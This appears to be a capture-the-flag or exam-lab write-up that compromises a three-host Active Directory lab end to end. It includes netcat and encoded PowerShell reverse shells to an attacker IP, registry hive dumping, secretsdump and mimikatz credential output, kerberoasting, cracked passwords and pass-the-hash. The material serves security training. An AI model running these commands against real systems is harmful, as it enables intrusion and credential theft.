# Active Directory

```
MS01 -> 192.168.243.147
MS02 -> 10.10.203.148
DC01 -> 10.10.203.146

credentials: Eric.Wallows / EricLikesRunning800
```

I start by connecting to the session via evil winrm and look at the double NIC:

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

I quickly see me have&#x20;

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i upload netcat and godpotato to the machine and launch the command to get a reverse shell:

```
#set up listener
nc -nlvp 1234
#in session:
./GodPotato-NET4.exe -cmd "nc.exe -e cmd.exe 192.168.45.249 1234"
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we have admin access so i go and look at the command to exfiltrate the hives:

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#exfiltration" %}

```
reg save HKLM\SAM "C:\Users\eric.wallows\Desktop\sam.save"
reg save HKLM\SECURITY "C:\Users\eric.wallows\Desktop\security.save"
reg save HKLM\SYSTEM "C:\Users\eric.wallows\Desktop\system.save"
```

Then i download everything to my attackbox:

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i dump everything with this command:

```
impacket-secretsdump -sam 'sam.save' -security 'security.save' -system 'system.save' LOCAL
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42)
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2025-02-25 18:34:19)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:41bbb6f29bca4192a9e81d50ca80d5795b43dc1855d3baa7940c42a26a84905861d257a62d85bc647985485ae08c44d749e7988e842a82c8ba51181adce6c93617d2413ae09d644ba53e83571a3262132fd0060cc9e0630b970c6b564b6f542a0505aa0b5f7c79837fd30cb55d718463a7ec1ce58b212127458214ad5e8b68f9b09698f3eec191ad4f19ad495f038e29244056cc9c43b48e52ccda146edd91a52176cfb06297987e5b9994e139d3f18bd5f5e9662036a23b81e09a5e253cbc727ae73701066c0cd86b3de2a6493cd5e1fcb5d44407b987bb2c68b85a4eb8de3fa08a295367007fa40fbaf4e305055135
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e60532ba861fa96b10dc19c10afbfb84
[*] DefaultPassword 
(Unknown User):7k8XHk3dMtmpnC7
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
[*] NL$KM 
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] Cleaning up...
```

Then i kerberoasted the DC with the creds of eric and had 2 hashes:

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

O was able to crack the 2 hashes and got password&#x20;

```
Diamond1
Dolphin1
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

With xp cmdshell:

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is my host file atm (ip changed):

```
10.10.86.147    MS01.oscp.exam    MS01
10.10.86.148    MS02.oscp.exam    MS02
10.10.86.146    DC01.oscp.exam    DC01
```

So i do my pivot and then on ligolo i have to set up a listener for reverse shell:

{% embed url="https://felix-billieres.gitbook.io/v2/active-directory/oscp-active-directory-cheat-sheet/pivoting-for-oscp#reverse-shells-from-internal-network" %}

```
nxc mssql 10.10.86.148 -u sql_svc -p 'Dolphin1' -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOAA2AC4AMQA0ADcAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

and i get my reverse shell:

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

I can upload files, not with wget or certutil but the  put-file module on nxc, ILY nxc

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I try to privesc, to download the files in windows old, and all but no success so i upload mimikatz on the machine and try some stuff:

```
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

Since the user sql\_svc has impersonate i use godpotato:

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

and after running mimikatz:

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
Authentication Id : 0 ; 441378 (00000000:0006bc22)                                                                  
Session           : Interactive from 1                                                                              
User Name         : Administrator                                                                                   
Domain            : OSCP                                                                                            
Logon Server      : DC01                                                                                            
Logon Time        : 2/12/2025 12:40:32 PM                                                                           
SID               : S-1-5-21-2610934713-1581164095-2706428072-500                                                   
        msv :                                                                                                       
         [00000003] Primary                                                                                         
         * Username : Administrator                                                                                 
         * Domain   : OSCP                                                                                          
         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5                                                              
         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17                                                      
         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769                                                              
        tspkg :                                                                                                     
        wdigest :                                                                                                   
         * Username : Administrator                                                                                 
         * Domain   : OSCP                                                                                          
         * Password : (null)                                                                                        
        kerberos :                                                                                                  
         * Username : Administrator                                                                                 
         * Domain   : OSCP.EXAM                                                                                     
         * Password : (null)                                                                                        
        ssp :                                                                                                       
        credman :                                                                                                   
        cloudap :
```

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>evil-winrm -i 10.10.86.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5</p></figcaption></figure>
